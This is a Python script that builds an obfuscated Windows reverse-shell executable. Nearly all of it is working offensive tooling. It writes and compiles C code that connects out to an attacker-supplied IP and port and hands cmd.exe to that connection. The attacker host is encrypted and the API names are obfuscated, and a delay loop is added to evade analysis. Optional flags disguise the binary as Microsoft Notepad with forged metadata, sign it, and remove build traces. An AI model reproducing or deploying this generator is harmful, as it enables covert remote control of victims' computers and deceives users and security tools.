from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import argparse
import subprocess
import os
import shlex
import shutil
import sys

key = b'1GJ7d9gY57Fdjo43'
aes = AES.new(key, AES.MODE_ECB)

def ensure_mingw_installed():
    if not shutil.which("x86_64-w64-mingw32-gcc"):
        print("[*] MinGW-w64 not detected. Installing...")
        try:
            subprocess.run(["sudo", "apt", "update"], check=True)
            subprocess.run(["sudo", "apt", "install", "-y", "mingw-w64"], check=True)
            print("[+] MinGW-w64 successfully installed.")
        except subprocess.CalledProcessError:
            print("[-] Installation failed for MinGW-w64. Please install it manually.")
            sys.exit(1)
    else:
        print("[+] MinGW-w64 is installed.")

def encrypt_bytes(text):
    padded = pad(text.encode(), 16)
    encrypted = aes.encrypt(padded)
    return ', '.join(f'0x{b:02X}' for b in encrypted)

def xor_string(s, xor_key=0x55):
    return ''.join(f'\\x{ord(c) ^ xor_key:02x}' for c in s)

def generate_payload_c(ip, cmd, port, notepad=False):
    ip_enc = encrypt_bytes(ip)
    cmd_enc = encrypt_bytes(cmd)

    xor_key = 0x55
    xws2 = xor_string("ws2_32.dll", xor_key)
    xk32 = xor_string("kernel32.dll", xor_key)
    xWSAStartup = xor_string("WSAStartup", xor_key)
    xWSASocketA = xor_string("WSASocketA", xor_key)
    xconnect = xor_string("connect", xor_key)
    xCreateProcessA = xor_string("CreateProcessA", xor_key)

    create_flags = "CREATE_NO_WINDOW"

    with open("payload.c", "w") as f:
        f.write(f'''#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include "aes.h"

#pragma comment(lib, "ws2_32")

__declspec(dllexport) void LegitEntryPoint() {{}}

void junk_func() {{
    int x = 123;
    for (int i = 0; i < 1000; i++) {{
        x ^= (x << 1) + i;
    }}
}}

const uint8_t key[16] = "1GJ7d9gY57Fdjo43";

uint8_t enc_ip[]  = {{ {ip_enc} }};
uint8_t enc_cmd[] = {{ {cmd_enc} }};

char* xor_decrypt(const char* data, char* output, char key) {{
    int i = 0;
    while (data[i]) {{
        output[i] = data[i] ^ key;
        i++;
    }}
    output[i] = 0;
    return output;
}}

FARPROC ResolveFunc(const char* xDll, const char* xFunc) {{
    char dll[64], func[64];
    xor_decrypt(xDll, dll, 0x{xor_key:02x});
    xor_decrypt(xFunc, func, 0x{xor_key:02x});
    HMODULE h = LoadLibraryA(dll);
    if (!h) return NULL;
    return GetProcAddress(h, func);
}}

void aes_decrypt_string(uint8_t* encrypted, char* output) {{
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);
    uint8_t tmp[16];
    memcpy(tmp, encrypted, 16);
    AES_ECB_decrypt(&ctx, tmp);
    memcpy(output, tmp, 16);
    output[15] = '\\0';
}}

int main() {{
    for (volatile int i = 0; i < 50000000; i++) {{}}

    char ip[16], cmd[16];
    aes_decrypt_string(enc_ip, ip);
    aes_decrypt_string(enc_cmd, cmd);

    typedef int (WINAPI *WSAStartupFunc)(WORD, LPWSADATA);
    typedef SOCKET (WINAPI *WSASocketAFunc)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
    typedef int (WINAPI *ConnectFunc)(SOCKET, const struct sockaddr*, int);
    typedef BOOL (WINAPI *CreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
                                               BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

    const char xDll1[] = "{xws2}";
    const char xDll2[] = "{xk32}";
    const char xWSAStartup[] = "{xWSAStartup}";
    const char xWSASocketA[] = "{xWSASocketA}";
    const char xconnect[] = "{xconnect}";
    const char xCreateProcessA[] = "{xCreateProcessA}";

    WSAStartupFunc     _WSAStartup     = (WSAStartupFunc)ResolveFunc(xDll1, xWSAStartup);
    WSASocketAFunc     _WSASocketA     = (WSASocketAFunc)ResolveFunc(xDll1, xWSASocketA);
    ConnectFunc        _connect        = (ConnectFunc)ResolveFunc(xDll1, xconnect);
    CreateProcessAFunc _CreateProcessA = (CreateProcessAFunc)ResolveFunc(xDll2, xCreateProcessA);

    if (!_WSAStartup || !_WSASocketA || !_connect || !_CreateProcessA)
        return 1;

    WSADATA wsaData;
    _WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET sock = _WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) return 1;

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons({port});
    inet_pton(AF_INET, ip, &server.sin_addr);

    if (_connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR)
        return 1;

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    DWORD flags = {create_flags};

    if (!_CreateProcessA(NULL, cmd, NULL, NULL, TRUE, flags, NULL, NULL, &si, &pi))
        return 1;

    return 0;
}}''')

    print("[+] payload.c generated.")

    if notepad:
        with open("notepad.rc", "w") as rc:
            rc.write(f'''
id ICON "notepad.ico"

1 VERSIONINFO
FILEVERSION 10,0,19041,1
PRODUCTVERSION 10,0,19041,1
FILEOS 0x4
FILETYPE 0x1
BEGIN
  BLOCK "StringFileInfo"
  BEGIN
    BLOCK "040904b0"
    BEGIN
      VALUE "CompanyName", "Microsoft Corporation"
      VALUE "FileDescription", "Notepad"
      VALUE "FileVersion", "10.0.19041.1"
      VALUE "InternalName", "notepad.exe"
      VALUE "OriginalFilename", "notepad.exe"
      VALUE "ProductName", "Microsoft® Windows® Operating System"
      VALUE "ProductVersion", "10.0.19041.1"
    END
  END
  BLOCK "VarFileInfo"
  BEGIN
    VALUE "Translation", 0x0409, 1200
  END
END
''')
        print("[+] notepad.rc generated.")

def compile_payload(notepad=False, keep=False, sign=False):
    exe_name = "notepad.exe" if notepad else "payload.exe"

    try:
        cmd = [
            "x86_64-w64-mingw32-gcc",
            "payload.c", "aes.c"
        ]

        if notepad:
            print("[*] Compiling with icon and metadata...")
            subprocess.run(["x86_64-w64-mingw32-windres", "notepad.rc", "-O", "coff", "-o", "notepad.res"], check=True)
            cmd.append("notepad.res")

        cmd += ["-o", exe_name, "-lws2_32", "-mwindows"]

        print(f"[*] Compiling: {' '.join(cmd)}")
        subprocess.run(cmd, check=True)
        print(f"[+] Compilation successful: {exe_name}")

        if sign:
            output_name = exe_name.replace(".exe", "_signed.exe")
            sign_cmd = f"python sign_exe.py {shlex.quote(exe_name)} --output {shlex.quote(output_name)}"
            print(f"[*] Signing: {sign_cmd}")
            subprocess.run(shlex.split(sign_cmd), check=True)
            print(f"[+] Signing complete: {output_name}")

    finally:
        if not keep:
            for file in ["payload.c", "notepad.rc", "notepad.res"]:
                if os.path.exists(file):
                    os.remove(file)
                    print(f"[-] Deleted temporary file: {file}")
        else:
            print("[*] --keep option enabled: temporary files kept.")

# ...

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Stealth AES payload + compiled generation")
    parser.add_argument("--ip", required=True, help="IP address to encrypt")
    parser.add_argument("--port", type=int, default=49557, help="TCP port (default: 49557)")
    parser.add_argument("--cmd", default="cmd.exe", help="Command to execute (default: cmd.exe)")
    parser.add_argument("--notepad", action="store_true", help="Fake notepad with icon and metadata")
    parser.add_argument("--keep", action="store_true", help="Keep temporary files")
    parser.add_argument("--sign", action="store_true", help="Sign the executable using sign_exe.py")

    args = parser.parse_args()

    generate_payload_c(args.ip, args.cmd, args.port, args.notepad)
    compile_payload(args.notepad, args.keep, args.sign)
